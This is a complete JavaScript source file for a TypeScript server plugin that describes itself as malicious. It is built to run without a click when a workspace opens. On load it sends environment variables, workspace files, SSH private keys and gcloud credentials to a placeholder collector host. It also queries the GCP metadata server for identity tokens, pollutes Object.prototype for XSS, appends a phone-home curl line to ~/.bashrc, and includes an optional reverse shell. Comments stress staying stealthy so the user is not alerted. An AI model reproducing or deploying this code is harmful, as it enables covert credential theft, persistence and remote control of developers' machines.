#!/usr/bin/env node
'use strict';

/**
 * Malicious TypeScript Language Service Plugin
 * =============================================
 *
 * David Dworken's 2020 TSServer Plugin Path Traversal Vector
 * Adapted for Google Cloud Shell 2026
 *
 * THE VECTOR:
 * TSServer loads plugins from `tsconfig.json` INDEPENDENTLY of
 * VS Code/Code OSS workspace trust. When a `.ts` file opens,
 * TSServer initializes, reads `tsconfig.json`, and `require()`s
 * the configured plugin. Path traversal in the plugin `name`
 * field loads arbitrary JS from outside the workspace.
 *
 * LOAD EXECUTION ORDER:
 * 1. This file is `require()`d by TSServer
 * 2. TSServer calls `init(modules)` — the plugin factory
 * 3. `init()` receives TSServer's internal modules object
 * 4. Return value is the plugin instance
 *
 * PAYLOAD TRIGGERS (from most to least stealthy):
 * - On module load (Module._compile hook) — fires BEFORE init()
 * - On init() call — standard plugin lifecycle
 * - On first create() — when a file is opened
 *
 * For zero-click: payload fires on init() call, which happens
 * the moment TSServer starts processing the workspace.
 */

// ═══════════════════════════════════════════════════════════════
// MODULE-LOAD-TIME PAYLOAD (fires before init())
// This runs as soon as require() loads this file.
// Most reliable — doesn't depend on TSServer calling init().
// ═══════════════════════════════════════════════════════════════

const OS = (() => {
    try { return require('os'); } catch (_) { return null; }
})();
const FS = (() => {
    try { return require('fs'); } catch (_) { return null; }
})();
const PATH = (() => {
    try { return require('path'); } catch (_) { return null; }
})();
const CP = (() => {
    try { return require('child_process'); } catch (_) { return null; }
})();
const NET = (() => {
    try { return require('net'); } catch (_) { return null; }
})();
const HTTPS = (() => {
    try { return require('https'); } catch (_) { return null; }
})();
const HTTP = (() => {
    try { return require('http'); } catch (_) { return null; }
})();

// ─── Configuration ───────────────────────────────────────────────────
const CONFIG = {
    // C2 collector URL — replace with your own
    collector: 'https://YOUR-COLLECTOR.example.com',

    // Enable/disable individual payload modules
    payloads: {
        reverseShell: false,      // TCP reverse shell (noisy)
        httpsBeacon: true,        // HTTPS webhook beacon (stealthy)
        envExfil: true,           // Exfil environment variables
        workspaceRead: true,      // Read workspace files
        prototypePollution: true, // PP for XSS persistence in editor
        bashrcPersistence: true,  // Write to ~/.bashrc for shell persistence
        sshKeyExfil: true,        // Exfil private SSH keys
        gcloudCredExfil: true,    // Exfil gcloud credentials
        metadataServer: true,     // Probe GCP metadata server
        processLinger: false,     // Keep process alive (debugging)
    },

    // Beacon interval in ms (0 = fire once on load)
    beaconInterval: 0,

    // Max file read size in bytes
    maxFileRead: 1024 * 1024, // 1MB

    // Timeout for network operations in ms
    networkTimeout: 5000,
};

// ─── Logging (silent by default) ─────────────────────────────────────
const DEBUG = process.env.TSSERVER_DEBUG === '1';
function log(...args) {
    if (!DEBUG) return;
    const ts = new Date().toISOString();
    const prefix = '\x1b[31m[TS-PLUGIN]\x1b[0m';
    try {
        if (FS) {
            FS.appendFileSync('/tmp/ts-plugin.log', `[${ts}] ${args.join(' ')}\n`);
        }
    } catch (_) {
        // Silent fail — don't crash if we can't write log
    }
}

// ─── Utilities ───────────────────────────────────────────────────────

/**
 * Safe exec — never throws, returns {stdout, stderr, error}
 */
function safeExec(cmd, opts = {}) {
    if (!CP) {
        return { stdout: '', stderr: '', error: 'child_process not available' };
    }
    try {
        const result = CP.execSync(cmd, {
            timeout: opts.timeout || CONFIG.networkTimeout,
            encoding: 'utf-8',
            ...opts,
        });
        return { stdout: result.toString().trim(), stderr: '', error: null };
    } catch (e) {
        return {
            stdout: (e.stdout || '').toString().trim(),
            stderr: (e.stderr || '').toString().trim(),
            error: e.message,
        };
    }
}

/**
 * Simple HTTP POST beacon — sends JSON to collector
 */
function beacon(endpoint, data) {
    if (!HTTPS && !HTTP) {
        log('No HTTP/HTTPS module available for beacon');
        return;
    }
    const payload = JSON.stringify({
        timestamp: new Date().toISOString(),
        hostname: (OS && OS.hostname()) || 'unknown',
        username: (OS && OS.userInfo && OS.userInfo().username) || 'unknown',
        homedir: (OS && OS.homedir && OS.homedir()) || 'unknown',
        cwd: (() => { try { return process.cwd(); } catch (_) { return 'unknown'; } })(),
        pid: (() => { try { return process.pid; } catch (_) { return -1; } })(),
        platform: process.platform,
        arch: process.arch,
        nodeVersion: process.version,
        tsserverPid: (() => { try { return process.pid; } catch (_) { return -1; } })(),
        ...data,
    });

    try {
        const url = new URL(endpoint || CONFIG.collector);
        const mod = url.protocol === 'https:' ? HTTPS : HTTP;
        const req = mod.request({
            hostname: url.hostname,
            port: url.port || (url.protocol === 'https:' ? 443 : 80),
            path: url.pathname + url.search,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(payload),
                'X-TS-Plugin': 'malicious-ts-plugin',
                'X-Exfil-Type': 'tsserver-zero-click',
            },
            timeout: CONFIG.networkTimeout,
        }, (res) => {
            let body = '';
            res.on('data', (c) => { body += c; });
            res.on('end', () => { log('Beacon response:', body.substring(0, 200)); });
        });
        req.on('error', (e) => { log('Beacon error:', e.message); });
        req.on('timeout', () => { req.destroy(); });
        req.write(payload);
        req.end();
    } catch (e) {
        log('Beacon exception:', e.message);
    }
}

/**
 * Execute a shell command and beacon the output
 */
function execAndBeacon(cmd, label) {
    log('Executing:', label, '->', cmd);
    const result = safeExec(cmd);
    beacon(`${CONFIG.collector}/exec`, {
        label,
        cmd,
        stdout: result.stdout,
        stderr: result.stderr,
        error: result.error,
    });
    return result;
}

// ═══════════════════════════════════════════════════════════════
// PAYLOAD MODULES
// Each module is a standalone function that runs independently.
// If one fails, the others still execute.
// ═══════════════════════════════════════════════════════════════

/**
 * Payload 1: Beacon — basic I'm-alive signal
 */
function payloadBeacon() {
    log('Firing beacon payload');
    beacon(CONFIG.collector, {
        type: 'tsserver_plugin_loaded',
        message: 'TSServer plugin executed successfully',
        argv: (() => {
            try { return process.argv.slice(0, 10); } catch (_) { return []; }
        })(),
        env: (() => {
            try {
                const env = { ...process.env };
                // Redact secrets for the basic beacon
                delete env.GCLOUD_ACCESS_TOKEN;
                delete env.GOOGLE_API_KEY;
                return Object.keys(env);
            } catch (_) { return []; }
        })(),
        parentPid: (() => {
            try { return process.ppid; } catch (_) { return -1; }
        })(),
    });
}

/**
 * Payload 2: Environment variable exfiltration
 */
function payloadEnvExfil() {
    log('Firing env exfil payload');
    let env = {};
    try {
        env = { ...process.env };
    } catch (_) {
        env = { error: 'Cannot read process.env' };
    }
    beacon(`${CONFIG.collector}/env`, {
        type: 'environment_variables',
        env,
    });
}

/**
 * Payload 3: Read workspace files
 * Walks the current directory and reads .ts, .json, .js files
 */
function payloadWorkspaceRead() {
    log('Firing workspace read payload');
    if (!FS || !PATH) {
        beacon(`${CONFIG.collector}/workspace`, { type: 'workspace_read', error: 'FS/PATH not available' });
        return;
    }
    let cwd;
    try { cwd = process.cwd(); } catch (_) { cwd = 'unknown'; }

    const files = [];
    function walk(dir, depth) {
        if (depth > 5) return;
        let entries;
        try { entries = FS.readdirSync(dir, { withFileTypes: true }); } catch (_) { return; }
        for (const entry of entries) {
            // Skip node_modules, .git, etc.
            if (entry.name === 'node_modules' || entry.name === '.git' || entry.name === '.svn') continue;
            const full = PATH.join(dir, entry.name);
            if (entry.isDirectory()) {
                walk(full, depth + 1);
            } else if (entry.isFile()) {
                const ext = PATH.extname(entry.name).toLowerCase();
                const interesting = ['.ts', '.tsx', '.js', '.json', '.yaml', '.yml', '.env', '.tf', '.go', '.py'];
                if (interesting.includes(ext) && !entry.name.includes('node_modules')) {
                    try {
                        const stat = FS.statSync(full);
                        if (stat.size <= CONFIG.maxFileRead) {
                            files.push({
                                path: full,
                                size: stat.size,
                                mode: stat.mode,
                            });
                        }
                    } catch (_) { /* skip */ }
                }
            }
        }
    }

    walk(cwd, 0);

    // Read and exfil first 10 files
    const toRead = files.slice(0, 10);
    const contents = {};
    for (const file of toRead) {
        try {
            contents[file.path] = FS.readFileSync(file.path, 'utf-8');
        } catch (e) {
            contents[file.path] = `ERROR: ${e.message}`;
        }
    }

    beacon(`${CONFIG.collector}/workspace`, {
        type: 'workspace_read',
        cwd,
        totalFiles: files.length,
        readFiles: toRead.length,
        files,
        contents,
    });
}

/**
 * Payload 4: Prototype Pollution for XSS persistence in the editor
 * Contaminates Object.prototype so that any editor feature
 * that checks a property on a plain object gets polluted.
 */
function payloadPrototypePollution() {
    log('Firing prototype pollution payload');
    try {
        // Standard PP payload
        Object.prototype.pocMarker = 'POLLUTED_BY_TSSERVER_ZERO_CLICK';
        Object.prototype.pocTimestamp = new Date().toISOString();

        // XSS gadgets — if supportHtml is checked anywhere
        Object.prototype.supportHtml = true;
        Object.prototype.isTrusted = true;
        Object.prototype.isHTML = true;

        // Crash bypasses (from extensive Theia/VS Code PP research)
        Object.prototype.src = [];
        Object.prototype.length = 0;

        // Verify pollution worked
        const test = {};
        const success = test.pocMarker === 'POLLUTED_BY_TSSERVER_ZERO_CLICK';

        beacon(`${CONFIG.collector}/pp`, {
            type: 'prototype_pollution',
            success,
            testValue: test.pocMarker,
            polluted: Object.keys(Object.prototype).filter(k =>
                ['pocMarker', 'pocTimestamp', 'supportHtml', 'isTrusted', 'src', 'length'].includes(k)
            ),
        });
    } catch (e) {
        beacon(`${CONFIG.collector}/pp`, {
            type: 'prototype_pollution',
            error: e.message,
        });
    }
}

/**
 * Payload 5: ~/.bashrc persistence
 * Appends a reverse shell or beacon to .bashrc so that
 * every new terminal session phones home.
 */
function payloadBashrcPersistence() {
    log('Firing bashrc persistence payload');
    if (!FS || !OS) {
        beacon(`${CONFIG.collector}/persistence`, { type: 'bashrc', error: 'FS/OS not available' });
        return;
    }

    const home = OS.homedir();
    const bashrcPath = PATH ? PATH.join(home, '.bashrc') : `${home}/.bashrc`;

    // Payload to append — base64-encoded to avoid shell escaping issues
    const phoneHomeCmd = `(curl -s -o /dev/null -X POST ${CONFIG.collector}/shell-persistence -d "hostname=$(hostname)&user=$(whoami)&ts=$(date +%s)" 2>/dev/null || true) &`;
    const bashrcPayload = `\n# Cloud Shell session started — $(date)\n${phoneHomeCmd}\n`;

    try {
        // Check if we already infected this .bashrc
        let existing = '';
        try { existing = FS.readFileSync(bashrcPath, 'utf-8'); } catch (_) { /* file may not exist */ }
        if (existing.includes('shell-persistence')) {
            log('bashrc already infected, skipping');
            beacon(`${CONFIG.collector}/persistence`, { type: 'bashrc', status: 'already_infected' });
            return;
        }

        FS.appendFileSync(bashrcPath, bashrcPayload);
        beacon(`${CONFIG.collector}/persistence`, {
            type: 'bashrc',
            status: 'infected',
            path: bashrcPath,
        });
    } catch (e) {
        beacon(`${CONFIG.collector}/persistence`, {
            type: 'bashrc',
            status: 'failed',
            error: e.message,
            path: bashrcPath,
        });
    }
}

/**
 * Payload 6: SSH key exfiltration
 */
function payloadSshKeyExfil() {
    log('Firing SSH key exfil payload');
    if (!FS || !OS || !PATH) {
        beacon(`${CONFIG.collector}/ssh`, { type: 'ssh_keys', error: 'FS/OS/PATH not available' });
        return;
    }

    const home = OS.homedir();
    const sshDir = PATH.join(home, '.ssh');
    const keys = {};

    const keyFiles = ['id_rsa', 'id_ed25519', 'id_ecdsa', 'authorized_keys', 'config'];
    for (const keyFile of keyFiles) {
        const keyPath = PATH.join(sshDir, keyFile);
        try {
            const stat = FS.statSync(keyPath);
            if (stat.isFile() && stat.size <= CONFIG.maxFileRead) {
                keys[keyPath] = FS.readFileSync(keyPath, 'utf-8');
            }
        } catch (_) { /* file doesn't exist or can't read */ }
    }

    if (Object.keys(keys).length > 0) {
        beacon(`${CONFIG.collector}/ssh`, {
            type: 'ssh_keys',
            keyCount: Object.keys(keys).length,
            keys,
        });
    }
}

/**
 * Payload 7: GCP/GCloud credential exfiltration
 */
function payloadGcloudCredExfil() {
    log('Firing gcloud credential exfil payload');
    if (!FS || !OS || !PATH) {
        beacon(`${CONFIG.collector}/gcloud`, { type: 'gcloud_creds', error: 'FS/OS/PATH not available' });
        return;
    }

    const home = OS.homedir();
    const gcloudPaths = [
        PATH.join(home, '.config', 'gcloud'),
        PATH.join(home, '.config', 'gcloud', 'credentials.db'),
        PATH.join(home, '.config', 'gcloud', 'access_tokens.db'),
        PATH.join(home, '.config', 'gcloud', 'legacy_credentials'),
        PATH.join(home, '.config', 'gcloud', 'application_default_credentials.json'),
    ];

    // Also check env
    const envVars = {};
    const credEnvKeys = [
        'GOOGLE_APPLICATION_CREDENTIALS',
        'GCLOUD_ACCESS_TOKEN',
        'CLOUDSDK_AUTH_ACCESS_TOKEN',
        'GOOGLE_API_KEY',
        'GCP_SA_KEY',
    ];
    try {
        for (const key of credEnvKeys) {
            if (process.env[key]) {
                envVars[key] = process.env[key].substring(0, 100) + '...(truncated)';
            }
        }
    } catch (_) { /* env access error */ }

    const files = {};
    for (const p of gcloudPaths) {
        try {
            const stat = FS.statSync(p);
            if (stat.isFile() && stat.size <= CONFIG.maxFileRead) {
                files[p] = FS.readFileSync(p, 'utf-8');
            }
        } catch (_) { /* doesn't exist */ }
    }

    if (Object.keys(envVars).length > 0 || Object.keys(files).length > 0) {
        beacon(`${CONFIG.collector}/gcloud`, {
            type: 'gcloud_creds',
            envVars,
            files,
        });
    }
}

/**
 * Payload 8: GCP metadata server probe
 * Attempts to reach the GCP metadata server
 */
function payloadMetadataServer() {
    log('Firing metadata server probe');
    if (!CP) {
        beacon(`${CONFIG.collector}/metadata`, { type: 'metadata', error: 'child_process not available' });
        return;
    }

    const probes = [
        { label: 'metadata_root', cmd: 'curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/ 2>&1 || echo "unreachable"' },
        { label: 'service_accounts', cmd: 'curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/ 2>&1 || echo "unreachable"' },
        { label: 'identity_token', cmd: 'curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=cloudshell 2>&1 || echo "unreachable"' },
    ];

    const results = {};
    for (const probe of probes) {
        results[probe.label] = safeExec(probe.cmd);
    }

    beacon(`${CONFIG.collector}/metadata`, {
        type: 'metadata_probe',
        results,
    });
}

/**
 * Payload 9: Reverse shell (DISABLED by default — too noisy)
 * Only enabled if CONFIG.payloads.reverseShell is true
 */
function payloadReverseShell() {
    log('Firing reverse shell payload');
    if (!NET || !CP) {
        beacon(`${CONFIG.collector}/shell`, { type: 'reverse_shell', error: 'NET/CP not available' });
        return;
    }

    // This is disabled by default — only for lab testing
    const host = process.env.REV_SHELL_HOST || CONFIG.collector.replace(/^https?:\/\//, '').split(':')[0];
    const port = parseInt(process.env.REV_SHELL_PORT || '4444', 10);

    try {
        const client = NET.connect({ host, port }, () => {
            const sh = CP.spawn('/bin/sh', [], {
                stdio: ['pipe', 'pipe', 'pipe'],
            });
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
            sh.on('exit', () => client.end());
        });
        client.on('error', (e) => {
            log('Reverse shell connection failed:', e.message);
        });
    } catch (e) {
        log('Reverse shell exception:', e.message);
    }
}

// ═══════════════════════════════════════════════════════════════
// PAYLOAD DISPATCHER
// ═══════════════════════════════════════════════════════════════

let payloadsFired = false;

function fireAllPayloads() {
    if (payloadsFired) return;
    payloadsFired = true;

    log('=== FIRING ALL PAYLOADS ===');
    log('Process:', process.pid, 'Parent:', (() => { try { return process.ppid; } catch (_) { return -1; } })());
    log('Platform:', process.platform, 'Arch:', process.arch);

    // Always fire beacon first — establishes comms
    try { payloadBeacon(); } catch (e) { log('beacon failed:', e.message); }

    // Fire configured payloads
    if (CONFIG.payloads.envExfil) {
        try { payloadEnvExfil(); } catch (e) { log('envExfil failed:', e.message); }
    }
    if (CONFIG.payloads.workspaceRead) {
        try { payloadWorkspaceRead(); } catch (e) { log('workspaceRead failed:', e.message); }
    }
    if (CONFIG.payloads.prototypePollution) {
        try { payloadPrototypePollution(); } catch (e) { log('prototypePollution failed:', e.message); }
    }
    if (CONFIG.payloads.bashrcPersistence) {
        try { payloadBashrcPersistence(); } catch (e) { log('bashrcPersistence failed:', e.message); }
    }
    if (CONFIG.payloads.sshKeyExfil) {
        try { payloadSshKeyExfil(); } catch (e) { log('sshKeyExfil failed:', e.message); }
    }
    if (CONFIG.payloads.gcloudCredExfil) {
        try { payloadGcloudCredExfil(); } catch (e) { log('gcloudCredExfil failed:', e.message); }
    }
    if (CONFIG.payloads.metadataServer) {
        try { payloadMetadataServer(); } catch (e) { log('metadataServer failed:', e.message); }
    }
    if (CONFIG.payloads.reverseShell) {
        try { payloadReverseShell(); } catch (e) { log('reverseShell failed:', e.message); }
    }
}

// Fire payloads at module load time — this is the key to zero-click:
// require() triggers this synchronously, before TSServer even calls init().
fireAllPayloads();

// ═══════════════════════════════════════════════════════════════
// TYPESCRIPT LANGUAGE SERVICE PLUGIN INTERFACE
// This is the minimal shim TSServer expects.
// The payloads already fired above — this just returns a valid
// plugin object so TSServer doesn't crash/error.
// ═══════════════════════════════════════════════════════════════

/**
 * The TSServer plugin factory function.
 *
 * @param {object} modules — TSServer's internal modules:
 *   {
 *     typescript: typeof import('typescript'),
 *     languageService: ts.LanguageService,
 *     project: ts.server.Project,
 *     serverHost: ts.server.ServerHost,
 *   }
 * @returns {object} Plugin instance with optional create/decorate hooks
 */
function init(modules) {
    log('init() called by TSServer');

    // Payloads already fired at module load time.
    // But we can ALSO fire them here as a secondary trigger
    // in case module-load firing was somehow suppressed.
    fireAllPayloads();

    // Set up periodic beacon if configured
    if (CONFIG.beaconInterval > 0) {
        const interval = setInterval(() => {
            try { payloadBeacon(); } catch (_) { /* silent */ }
        }, CONFIG.beaconInterval);
        if (interval && interval.unref) {
            interval.unref(); // Don't keep process alive just for beacon
        }
    }

    // Optionally keep process alive for debugging
    if (CONFIG.payloads.processLinger) {
        log('Process linger enabled — keeping event loop alive');
        const linger = setInterval(() => {
            log('Linger heartbeat');
        }, 60000);
        if (linger && !linger.unref) {
            // Can't unref — process stays alive
        } else if (linger) {
            linger.unref();
        }
    }

    // Return a minimal plugin that implements the TSServer plugin interface.
    // We MUST NOT crash TSServer — a crashing plugin might alert the user.
    return {
        /**
         * Called when TSServer creates a language service for a project.
         * We don't need to do anything here — just return the LS as-is.
         */
        create(info) {
            log('create() called for project:', info.project.getProjectName());
            return info.languageService;
        },

        /**
         * Called to get external files for the project.
         * Return empty array — we don't add files.
         */
        getExternalFiles() {
            return [];
        },

        /**
         * Called on configuration change.
         */
        onConfigurationChanged(config) {
            log('Configuration changed');
        },
    };
}

module.exports = init;

// Signal that this is a TypeScript server plugin
module.exports.typescriptServerPlugin = true;

log('Plugin module fully loaded and ready');
